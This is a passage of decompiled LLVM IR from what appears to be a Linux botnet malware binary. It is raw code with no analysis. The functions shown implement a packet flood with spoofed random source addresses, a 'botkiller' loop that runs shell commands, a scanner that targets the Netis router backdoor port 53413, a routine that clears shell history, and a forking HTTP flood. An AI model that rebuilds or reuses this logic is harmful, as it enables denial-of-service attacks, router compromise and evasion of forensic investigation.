  %v5_804d1d8 = icmp eq i32 %v3_804d1cd, 0
  %v1_804d1dc = icmp eq i1 %v5_804d1d8, false
  %tmp104 = inttoptr i32 %v3_804d1cd to i8*
  br i1 %v1_804d1dc, label %dec_label_pc_804d032, label %dec_label_pc_804d1e2

dec_label_pc_804d1e2:                             ; preds = %dec_label_pc_804d1c3, %dec_label_pc_804d016, %dec_label_pc_804cfd5
  %v0_804d1e2 = phi i8* [ %v0_804d1e2.pre, %dec_label_pc_804cfd5 ], [ %v5_804d02a, %dec_label_pc_804d016 ], [ %tmp104, %dec_label_pc_804d1c3 ]
  %v1_804d1e2 = ptrtoint i8* %v0_804d1e2 to i32
  %v2_804d1e2 = call i32 @rand_cmwc(i32 %v1_804d1e2)
  %sext8 = mul i32 %v2_804d1e2, 65536
  %v1_804d1e7 = sdiv i32 %sext8, 65536
  store i32 %v1_804d1e7, i32* %edx.global-to-local, align 4
  %v1_804d1ec = trunc i32 %v1_804d1e7 to i16
  %v3_804d1ec = add i32 %v2_804cf19, 34
  %v4_804d1ec = inttoptr i32 %v3_804d1ec to i16*
  store i16 %v1_804d1ec, i16* %v4_804d1ec, align 2
  %v1_804d1f3 = add i32 %v2_804cf19, 36
  %v2_804d1f3 = inttoptr i32 %v1_804d1f3 to i16*
  store i16 0, i16* %v2_804d1f3, align 4
  store i32 %v1_804cf31, i32* %eax.global-to-local, align 4
  %v1_804d1fc = add i32 %v2_804cf19, 38
  %v2_804d1fc = inttoptr i32 %v1_804d1fc to i16*
  store i16 0, i16* %v2_804d1fc, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804ce08, label %dec_label_pc_804d213, label %dec_label_pc_804d208

dec_label_pc_804d208:                             ; preds = %dec_label_pc_804d1e2
  %v0_804d208 = load i8*, i8** %stack_var_-20, align 4
  %v1_804d208 = ptrtoint i8* %v0_804d208 to i32
  %v2_804d208 = call i32 @rand_cmwc(i32 %v1_804d208)
  store i32 %v2_804d208, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d22b

dec_label_pc_804d213:                             ; preds = %dec_label_pc_804d1e2
  %v1_804d216 = urem i32 %arg2, 65536
  store i32 %v1_804d216, i32* %eax.global-to-local, align 4
  %v0_804d21b = load i32, i32* @esp, align 4
  %v5_804d21b = icmp ult i32 %v0_804d21b, 12
  store i1 %v5_804d21b, i1* %cf.global-to-local, align 1
  %v2_804d21e = add i32 %v0_804d21b, -16
  %v3_804d21e = inttoptr i32 %v2_804d21e to i32*
  store i32 %v1_804d216, i32* %v3_804d21e, align 4
  %v1_804d21f = sext i16 %tmp47 to i32
  %v2_804d21f = call i32 @htons(i32 %v1_804d21f)
  store i32 %v2_804d21f, i32* %eax.global-to-local, align 4
  %v0_804d224 = load i32, i32* @esp, align 4
  %v2_804d224 = icmp ugt i32 %v0_804d224, -17
  store i1 %v2_804d224, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d22b

dec_label_pc_804d22b:                             ; preds = %dec_label_pc_804d208, %dec_label_pc_804d213
  %storemerge.in = phi i32 [ %v2_804d21f, %dec_label_pc_804d213 ], [ %v2_804d208, %dec_label_pc_804d208 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804cf31, i32* %eax.global-to-local, align 4
  %v4_804d22e = urem i32 %storemerge.in, 65536
  %v5_804d22e = load i32, i32* @esi, align 4
  %v6_804d22e = and i32 %v5_804d22e, -65536
  %v7_804d22e = or i32 %v6_804d22e, %v4_804d22e
  store i32 %v7_804d22e, i32* @esi, align 4
  %v3_804d232 = add i32 %v2_804cf19, 22
  %v4_804d232 = inttoptr i32 %v3_804d232 to i16*
  store i16 %storemerge, i16* %v4_804d232, align 2
  %v0_804d236 = load i32, i32* @esp, align 4
  %v5_804d236 = icmp ult i32 %v0_804d236, 8
  store i1 %v5_804d236, i1* %cf.global-to-local, align 1
  %v6_804d239 = add i32 %v0_804d236, -12
  %v7_804d239 = inttoptr i32 %v6_804d239 to i32*
  store i32 %v1_804cf31, i32* %v7_804d239, align 4
  %v5_804d23c = add i32 %v0_804d236, -16
  %v6_804d23c = inttoptr i32 %v5_804d23c to i32*
  store i32 %v2_804cf19, i32* %v6_804d23c, align 4
  %v0_804d23f = call i32 @tcpcsum()
  %v1_804d23f = trunc i32 %v0_804d23f to i16
  %sext13 = mul i32 %v0_804d23f, 65536
  %v1_804d247 = sdiv i32 %sext13, 65536
  store i32 %v1_804d247, i32* %edx.global-to-local, align 4
  store i16 %v1_804d23f, i16* %v2_804d1f3, align 4
  store i32 %v2_804cf19, i32* %eax.global-to-local, align 4
  %v1_804d253 = or i32 %v2_804cf19, 2
  %v2_804d253 = inttoptr i32 %v1_804d253 to i16*
  %v3_804d253 = load i16, i16* %v2_804d253, align 2
  %v4_804d253 = zext i16 %v3_804d253 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804d253, i32* %edx.global-to-local, align 4
  store i32 %v2_804cf19, i32* %eax.global-to-local, align 4
  %v1_804d262 = load i32, i32* @esp, align 4
  %v2_804d262 = add i32 %v1_804d262, -4
  %v3_804d262 = inttoptr i32 %v2_804d262 to i32*
  store i32 %v4_804d253, i32* %v3_804d262, align 4
  %v0_804d263 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d263 = add i32 %v1_804d262, -8
  %v3_804d263 = inttoptr i32 %v2_804d263 to i32*
  store i32 %v0_804d263, i32* %v3_804d263, align 4
  %sext14 = mul i32 %storemerge.in, 65536
  %v1_804d264 = sdiv i32 %sext14, 65536
  %v3_804d264 = inttoptr i32 %v1_804d264 to i16*
  %v4_804d264 = call i32 @csum(i16* %v3_804d264, i32 ptrtoint (i32* @0 to i32))
  %v5_804d264 = trunc i32 %v4_804d264 to i16
  %sext15 = mul i32 %v4_804d264, 65536
  %v1_804d26c = sdiv i32 %sext15, 65536
  store i32 %v1_804d26c, i32* %edx.global-to-local, align 4
  store i32 %v2_804cf19, i32* %eax.global-to-local, align 4
  %v3_804d271 = or i32 %v2_804cf19, 10
  %v4_804d271 = inttoptr i32 %v3_804d271 to i16*
  store i16 %v5_804d264, i16* %v4_804d271, align 2
  %v0_804d275 = load i32, i32* @esp, align 4
  %v5_804d275 = icmp ult i32 %v0_804d275, 12
  store i1 %v5_804d275, i1* %cf.global-to-local, align 1
  %v1_804d278 = add i32 %v0_804d275, -16
  %v2_804d278 = inttoptr i32 %v1_804d278 to i32*
  store i32 0, i32* %v2_804d278, align 4
  %v2_804d27a = inttoptr i32 %v1_804d264 to i32*
  %v3_804d27a = call i32 @__GI_time(i32* %v2_804d27a)
  %v0_804d27f = load i32, i32* @esp, align 4
  %v1_804d27f = add i32 %v0_804d27f, 16
  %v5_804d282 = add i32 %v3_804d27a, %arg3
  %v10_804d282 = icmp ult i32 %v5_804d282, %v3_804d27a
  store i1 %v10_804d282, i1* %cf.global-to-local, align 1
  store i32 %v5_804d282, i32* %eax.global-to-local, align 4
  %v2_804d2cd = or i32 %v2_804cf19, 12
  %v3_804d2cd = inttoptr i32 %v2_804d2cd to i32*
  %v3_804d2da = or i32 %v2_804cf19, 4
  %v4_804d2da = inttoptr i32 %v3_804d2da to i16*
  br label %dec_label_pc_804d291

dec_label_pc_804d291:                             ; preds = %dec_label_pc_804d348, %dec_label_pc_804d366, %dec_label_pc_804d22b
  %v0_804d297 = phi i32 [ %v1_804d27f, %dec_label_pc_804d22b ], [ %v0_804d297.pre.pre, %dec_label_pc_804d366 ], [ %v1_804d352, %dec_label_pc_804d348 ]
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804d22b ], [ %v4_804d366, %dec_label_pc_804d366 ], [ 0, %dec_label_pc_804d348 ]
  store i32 %v2_804ce30, i32* %eax.global-to-local, align 4
  store i32 %v2_804cf19, i32* %edx.global-to-local, align 4
  %v5_804d297 = icmp ult i32 %v0_804d297, 8
  store i1 %v5_804d297, i1* %cf.global-to-local, align 1
  %v1_804d29a = add i32 %v0_804d297, -12
  %v2_804d29a = inttoptr i32 %v1_804d29a to i32*
  store i32 16, i32* %v2_804d29a, align 4
  %v2_804d29c = add i32 %v0_804d297, -16
  %v3_804d29c = inttoptr i32 %v2_804d29c to i32*
  store i32 %v2_804ce30, i32* %v3_804d29c, align 4
  %v1_804d29d = add i32 %v0_804d297, -20
  %v2_804d29d = inttoptr i32 %v1_804d29d to i32*
  store i32 0, i32* %v2_804d29d, align 4
  %v5_804d29f = add i32 %v0_804d297, -24
  %v6_804d29f = inttoptr i32 %v5_804d29f to i32*
  store i32 %v1_804cef9, i32* %v6_804d29f, align 4
  %v0_804d2a2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d2a2 = add i32 %v0_804d297, -28
  %v3_804d2a2 = inttoptr i32 %v2_804d2a2 to i32*
  store i32 %v0_804d2a2, i32* %v3_804d2a2, align 4
  %v5_804d2a3 = add i32 %v0_804d297, -32
  %v6_804d2a3 = inttoptr i32 %v5_804d2a3 to i32*
  store i32 %v4_804ce67, i32* %v6_804d2a3, align 4
  %v1_804d2a6 = load i32, i32* %stack_var_-64, align 4
  %v2_804d2a6 = load i32, i32* %stack_var_-60, align 4
  %v3_804d2a6 = load i32, i32* %stack_var_-56, align 4
  %v4_804d2a6 = load i32, i32* %stack_var_-52, align 4
  %v6_804d2a6 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804d2a6, i32 %v2_804d2a6, i32 %v3_804d2a6, i32 %v4_804d2a6, i32 0)
  store i32 %v6_804d2a6, i32* %eax.global-to-local, align 4
  %v0_804d2ab = load i32, i32* @esp, align 4
  %v1_804d2ab = add i32 %v0_804d2ab, 32
  %v5_804d2ae = icmp ult i32 %v1_804d2ab, 12
  store i1 %v5_804d2ae, i1* %cf.global-to-local, align 1
  %v5_804d2b1 = add i32 %v0_804d2ab, 16
  %v6_804d2b1 = inttoptr i32 %v5_804d2b1 to i32*
  store i32 %storemerge12, i32* %v6_804d2b1, align 4
  %v1_804d2b4 = load i32, i32* %stack_var_-64, align 4
  %v2_804d2b4 = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804d2b4)
  store i32 %v2_804d2b4, i32* %eax.global-to-local, align 4
  %v0_804d2b9 = load i32, i32* @esp, align 4
  %v1_804d2b9 = add i32 %v0_804d2b9, 16
  %v5_804d2bc = icmp ult i32 %v1_804d2b9, 12
  store i1 %v5_804d2bc, i1* %cf.global-to-local, align 1
  %v3_804d2bf = inttoptr i32 %v0_804d2b9 to i32*
  store i32 %v2_804d2b4, i32* %v3_804d2bf, align 4
  %v0_804d2c0 = call i32 @htonl()
  %v0_804d2c5 = load i32, i32* @esp, align 4
  %v2_804d2c5 = icmp ugt i32 %v0_804d2c5, -17
  store i1 %v2_804d2c5, i1* %cf.global-to-local, align 1
  store i32 %v0_804d2c0, i32* %edx.global-to-local, align 4
  store i32 %v2_804cf19, i32* %eax.global-to-local, align 4
  store i32 %v0_804d2c0, i32* %v3_804d2cd, align 4
  %v1_804d2d0 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext9 = mul i32 %v1_804d2d0, 65536
  %v1_804d2d5 = sdiv i32 %sext9, 65536
  store i32 %v1_804d2d5, i32* %edx.global-to-local, align 4
  store i32 %v2_804cf19, i32* %eax.global-to-local, align 4
  %v1_804d2da = trunc i32 %v1_804d2d5 to i16
  store i16 %v1_804d2da, i16* %v4_804d2da, align 4
  %v1_804d2de = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804d2de, i32* %edx.global-to-local, align 4
  store i32 %v1_804cf31, i32* %eax.global-to-local, align 4
  store i32 %v1_804d2de, i32* %v3_804cf86, align 8
  %v1_804d2eb = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext10 = mul i32 %v1_804d2eb, 65536
  %v1_804d2f0 = sdiv i32 %sext10, 65536
  store i32 %v1_804d2f0, i32* %edx.global-to-local, align 4
  %v1_804d2f5 = trunc i32 %v1_804d2f0 to i16
  store i16 %v1_804d2f5, i16* %v5_804cf34, align 4
  store i32 %v1_804cf31, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804d1f3, align 4
  %v0_804d301 = load i32, i32* @esp, align 4
  %v5_804d301 = icmp ult i32 %v0_804d301, 8
  store i1 %v5_804d301, i1* %cf.global-to-local, align 1
  %v6_804d304 = add i32 %v0_804d301, -12
  %v7_804d304 = inttoptr i32 %v6_804d304 to i32*
  store i32 %v1_804cf31, i32* %v7_804d304, align 4
  %v5_804d307 = add i32 %v0_804d301, -16
  %v6_804d307 = inttoptr i32 %v5_804d307 to i32*
  store i32 %v2_804cf19, i32* %v6_804d307, align 4
  %v0_804d30a = call i32 @tcpcsum()
  %v1_804d30a = trunc i32 %v0_804d30a to i16
  %sext17 = mul i32 %v0_804d30a, 65536
  %v1_804d312 = sdiv i32 %sext17, 65536
  store i32 %v1_804d312, i32* %edx.global-to-local, align 4
  store i16 %v1_804d30a, i16* %v2_804d1f3, align 4
  store i32 %v2_804cf19, i32* %eax.global-to-local, align 4
  %v3_804d31e = load i16, i16* %v2_804d253, align 2
  %v4_804d31e = zext i16 %v3_804d31e to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804d31e, i32* %edx.global-to-local, align 4
  store i32 %v2_804cf19, i32* %eax.global-to-local, align 4
  %v1_804d32d = load i32, i32* @esp, align 4
  %v2_804d32d = add i32 %v1_804d32d, -4
  %v3_804d32d = inttoptr i32 %v2_804d32d to i32*
  store i32 %v4_804d31e, i32* %v3_804d32d, align 4
  %v0_804d32e = load i32, i32* %eax.global-to-local, align 4
  %v2_804d32e = add i32 %v1_804d32d, -8
  %v3_804d32e = inttoptr i32 %v2_804d32e to i32*
  store i32 %v0_804d32e, i32* %v3_804d32e, align 4
  %v1_804d32f = load i32, i32* %stack_var_-64, align 4
  %v2_804d32f = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804d32f = call i32 @csum(i16* %v2_804d32f, i32 %v1_804d32f)
  %v4_804d32f = trunc i32 %v3_804d32f to i16
  %sext18 = mul i32 %v3_804d32f, 65536
  %v1_804d337 = sdiv i32 %sext18, 65536
  store i32 %v1_804d337, i32* %edx.global-to-local, align 4
  store i32 %v2_804cf19, i32* %eax.global-to-local, align 4
  store i16 %v4_804d32f, i16* %v4_804d271, align 2
  store i32 %arg7, i32* @edi, align 4
  %v10_804d343 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804d343, i1* %cf.global-to-local, align 1
  %v15_804d343 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804d346 = icmp eq i1 %v15_804d343, false
  br i1 %v1_804d346, label %dec_label_pc_804d366, label %dec_label_pc_804d348

dec_label_pc_804d348:                             ; preds = %dec_label_pc_804d291
  %v0_804d348 = load i32, i32* @esp, align 4
  %v5_804d348 = icmp ult i32 %v0_804d348, 12
  store i1 %v5_804d348, i1* %cf.global-to-local, align 1
  %v1_804d34b = add i32 %v0_804d348, -16
  %v2_804d34b = inttoptr i32 %v1_804d34b to i32*
  store i32 0, i32* %v2_804d34b, align 4
  %v1_804d34d = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804d34d = call i32 @__GI_time(i32* %v1_804d34d)
  store i32 %v2_804d34d, i32* %eax.global-to-local, align 4
  %v0_804d352 = load i32, i32* @esp, align 4
  %v1_804d352 = add i32 %v0_804d352, 16
  %v10_804d355 = icmp ult i32 %v2_804d34d, %v5_804d282
  store i1 %v10_804d355, i1* %cf.global-to-local, align 1
  %v8_804d358 = icmp sgt i32 %v2_804d34d, %v5_804d282
  br i1 %v8_804d358, label %dec_label_pc_804d36e, label %dec_label_pc_804d291

dec_label_pc_804d366:                             ; preds = %dec_label_pc_804d291
  %v4_804d366 = add i32 %stack_var_-68.0, 1
  %v0_804d297.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d291

dec_label_pc_804d36e:                             ; preds = %dec_label_pc_804d348, %dec_label_pc_804ce2d, %dec_label_pc_804ceb6, %dec_label_pc_804ce78
  %v0_804d378 = phi i32 [ %v4_804ce3a, %dec_label_pc_804ce2d ], [ %v3_804cec4, %dec_label_pc_804ceb6 ], [ %v3_804ce86, %dec_label_pc_804ce78 ], [ %v2_804d34d, %dec_label_pc_804d348 ]
  store i32 %v0_804cdec, i32* @ebx, align 4
  store i32 %v0_804cdeb, i32* @esi, align 4
  ret i32 %v0_804d378

; uselistorder directives
  uselistorder i32 %v2_804d34d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804d2f0, { 1, 0 }
  uselistorder i32 %v1_804d2d5, { 1, 0 }
  uselistorder i32 %v0_804d2c0, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_804d297, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804d282, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804d27a, { 1, 0 }
  uselistorder i32 %v1_804d264, { 1, 0 }
  uselistorder i32 %v1_804d216, { 1, 0 }
  uselistorder i32 %v1_804d1e7, { 1, 0 }
  uselistorder i32 %v3_804d1cd, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i32 %v1_804d1a2, { 1, 0 }
  uselistorder i1 %v0_804d189, { 1, 0 }
  uselistorder i32 %v6_804d187, { 1, 0 }
  uselistorder i32 %v1_804d14f, { 1, 0 }
  uselistorder i1 %v0_804d136, { 1, 0 }
  uselistorder i32 %v6_804d134, { 1, 0 }
  uselistorder i32 %v1_804d0f9, { 1, 0 }
  uselistorder i1 %v0_804d0e0, { 1, 0 }
  uselistorder i32 %v6_804d0de, { 1, 0 }
  uselistorder i32 %v1_804d0af, { 1, 0 }
  uselistorder i1 %v0_804d096, { 1, 0 }
  uselistorder i32 %v6_804d094, { 1, 0 }
  uselistorder i32 %v1_804d06b, { 1, 0 }
  uselistorder i1 %v0_804d052, { 1, 0 }
  uselistorder i32 %v6_804d050, { 1, 0 }
  uselistorder i32 %v4_804d032, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10 }
  uselistorder i32 %stack_var_-160.129, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-156.130, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804d1b2, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804d19f, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i32 %v1_804d00b, { 1, 0 }
  uselistorder i32 %v1_804cfff, { 1, 0 }
  uselistorder i32 %v1_804cff3, { 1, 0 }
  uselistorder i32 %v1_804cfe7, { 1, 0 }
  uselistorder i32 %v1_804cfdb, { 1, 0 }
  uselistorder i8* %v2_804cfd8, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804cfc2, { 1, 0 }
  uselistorder i32 %v6_804cfc0, { 1, 0 }
  uselistorder i32 %v1_804cf74, { 1, 0 }
  uselistorder i32 %v0_804cf56, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804cf31, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_804cf19, { 14, 13, 12, 11, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 4, 22, 21, 20, 19, 27, 18, 17, 16, 15, 3, 2, 1, 0 }
  uselistorder i32 %v2_804cf0e, { 1, 0, 2 }
  uselistorder i32 %v2_804ceef, { 1, 0 }
  uselistorder i32 %v1_804ce18, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-60, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 33, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 28, 27, 29, 31, 30, 32, 64, 65, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32 -24, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 -20, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d36e, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804d291, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d22b, { 1, 0 }
  uselistorder label %dec_label_pc_804d1c3, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804d032, { 1, 0 }
  uselistorder label %dec_label_pc_804cef6, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %dec_label_pc_804ce2d, { 1, 0 }
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %v2_804d38b = ptrtoint i32* %stack_var_-88 to i32
  %v2_804d3b3 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_804d37f

dec_label_pc_804d37f:                             ; preds = %dec_label_pc_804d42e, %entry
  br label %dec_label_pc_804d38b

dec_label_pc_804d38b:                             ; preds = %dec_label_pc_804d37f, %dec_label_pc_804d38b
  %storemerge117 = phi i32 [ 0, %dec_label_pc_804d37f ], [ %v4_804d421, %dec_label_pc_804d38b ]
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v1_804d3a4 = mul nuw nsw i32 %storemerge117, 4
  %v2_804d3a4 = add i32 %v1_804d3a4, ptrtoint ([87 x i8*]* @global_var_8061040.313 to i32)
  %v3_804d3a4 = inttoptr i32 %v2_804d3a4 to i32*
  %v4_804d3a4 = load i32, i32* %v3_804d3a4, align 4
  %v3_804d3b3 = call i32 @strcat(i8* %v2_804d3b3, i32 %v4_804d3a4)
  %v1_804d3c2 = call i32 @__libc_system(i32 %v2_804d38b)
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v4_804d3e7 = load i32, i32* %v3_804d3a4, align 4
  %v3_804d3f6 = call i32 @strcat(i8* %v2_804d3b3, i32 %v4_804d3e7)
  %v3_804d40a = call i32 @strcat(i8* %v2_804d3b3, i32 ptrtoint (i32* @global_var_80579d9.314 to i32))
  %v1_804d419 = call i32 @__libc_system(i32 %v2_804d38b)
  %v4_804d421 = add nuw nsw i32 %storemerge117, 1
  %exitcond = icmp eq i32 %v4_804d421, 9
  br i1 %exitcond, label %dec_label_pc_804d42e, label %dec_label_pc_804d38b

dec_label_pc_804d42e:                             ; preds = %dec_label_pc_804d38b
  %v1_804d433 = call i32 @sleep(i32 5)
  br label %dec_label_pc_804d37f

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder [3 x i8]* @global_var_80569fb.15, { 1, 0 }
  uselistorder label %dec_label_pc_804d38b, { 1, 0 }
}

define i32 @NetisScanner() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_804d484 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_804d447

dec_label_pc_804d447:                             ; preds = %dec_label_pc_804d447, %entry
  %v3_804d450 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_804d469 = call i32 @htons(i32 53413)
  store i32 %v1_804d469, i32* @eax, align 4
  %sext = mul i32 %v1_804d469, 65536
  %v1_804d475 = sdiv i32 %sext, 65536
  %v2_804d475 = call i32 @NetisRanges(i32 %v1_804d475)
  %v3_804d4b9 = call i32 @_strlen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80579db.315, i32 0, i32 0))
  %v7_804d4cf = call i32 @__libc_sendto(i32 %v3_804d450, i32 ptrtoint ([16 x i8]* @global_var_80579db.315 to i32), i32 %v3_804d4b9, i32 0, i32 %v2_804d484, i32 16)
  store i32 ptrtoint ([3 x i8]* @global_var_80579ec.316 to i32), i32* @edi, align 4
  %v3_804d4eb = call i32 @_strlen(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80579ec.316, i32 0, i32 0))
  %v7_804d501 = call i32 @__libc_sendto(i32 %v3_804d450, i32 ptrtoint ([3 x i8]* @global_var_80579ec.316 to i32), i32 %v3_804d4eb, i32 0, i32 %v2_804d484, i32 16)
  %v1_804d50f = call i32 @__libc_close(i32 %v3_804d450)
  br label %dec_label_pc_804d447

; uselistorder directives
  uselistorder [3 x i8]* @global_var_80579ec.316, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 4, 3, 2, 1, 0 }
  uselistorder [16 x i8]* @global_var_80579db.315, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_804d52a = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_8057b80.317 to i32))
  %v2_804d53a = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_8057b96.318 to i32))
  %v2_804d54a = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_8057bb4.319 to i32))
  ret i32 %v2_804d54a
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-3144 = alloca i32, align 4
  %stack_var_-2620 = alloca i32, align 4
  %v0_804d558 = load i32, i32* @ebx, align 4
  %v4_804d57f = bitcast i32* %stack_var_-2620 to i16*
  %v5_804d57f = call i32 @memcpy(i16* %v4_804d57f, i32 ptrtoint ([649 x i8*]* @global_var_805e5a0.622 to i32), i32 2596)
  %v2_804d5aa = call i32 @__GI_time(i32* null)
  %v5_804d5b2 = add i32 %v2_804d5aa, %arg5
  store i32 %v5_804d5b2, i32* @eax, align 4
  %v1_804d5b8 = call i32 @random()
  %v2_804d5c8 = ashr i32 %v1_804d5b8, 31
  %v2_804d5cb = zext i32 %v1_804d5b8 to i64
  %v4_804d5cb = zext i32 %v2_804d5c8 to i64
  %v5_804d5cb = mul nuw i64 %v4_804d5cb, 4294967296
  %v6_804d5cb = or i64 %v5_804d5cb, %v2_804d5cb
  %v10_804d5cb = srem i64 %v6_804d5cb, 674
  %v11_804d5cb = trunc i64 %v10_804d5cb to i32
  store i32 %v11_804d5cb, i32* @eax, align 4
  %v0_804d5cf = load i32, i32* @ebp, align 4
  %v2_804d5cf = mul i32 %v11_804d5cb, 4
  %v3_804d5cf = add i32 %v0_804d5cf, -2616
  %v4_804d5cf = add i32 %v3_804d5cf, %v2_804d5cf
  %v5_804d5cf = inttoptr i32 %v4_804d5cf to i32*
  %v6_804d5cf = load i32, i32* %v5_804d5cf, align 4
  store i32 %v6_804d5cf, i32* @ebx, align 4
  %v0_804d5d6 = call i32 @random()
  store i32 30, i32* @edi, align 4
  %v2_804d604 = ptrtoint i32* %stack_var_-3144 to i32
  %v5_804d60b = call i32 @sprintf(i32 %v2_804d604, i32 ptrtoint ([62 x i8]* @global_var_805efdc.626 to i32), i32 %arg2, i32 %arg4)
  %v5_804d6bc45 = icmp sgt i32 %arg6, 0
  br i1 %v5_804d6bc45, label %dec_label_pc_804d61f, label %dec_label_pc_804d6c2

dec_label_pc_804d61f:                             ; preds = %entry, %dec_label_pc_804d6b3
  %storemerge46 = phi i32 [ %v4_804d6b3, %dec_label_pc_804d6b3 ], [ 0, %entry ]
  %v1_804d61f = call i32 @__libc_fork(i32 %storemerge46)
  %v1_804d624 = icmp eq i32 %v1_804d61f, 0
  br i1 %v1_804d624, label %dec_label_pc_804d6b3, label %dec_label_pc_804d697.preheader

dec_label_pc_804d697.preheader:                   ; preds = %dec_label_pc_804d61f
  %v4_804d666 = bitcast i32* %stack_var_-3144 to i8*
  %v2_804d69c39 = call i32 @__GI_time(i32* null)
  %v5_804d6a742 = icmp slt i32 %v2_804d69c39, %v5_804d5b2
  br i1 %v5_804d6a742, label %dec_label_pc_804d62e.lr.ph, label %dec_label_pc_804d6a9

dec_label_pc_804d62e.lr.ph:                       ; preds = %dec_label_pc_804d697.preheader
  br label %dec_label_pc_804d62e

dec_label_pc_804d62e:                             ; preds = %dec_label_pc_804d62e.lr.ph, %dec_label_pc_804d697.backedge
  store i32 %arg1, i32* @edx, align 4
  %v4_804d641 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804d64c = icmp eq i32 %v4_804d641, 0
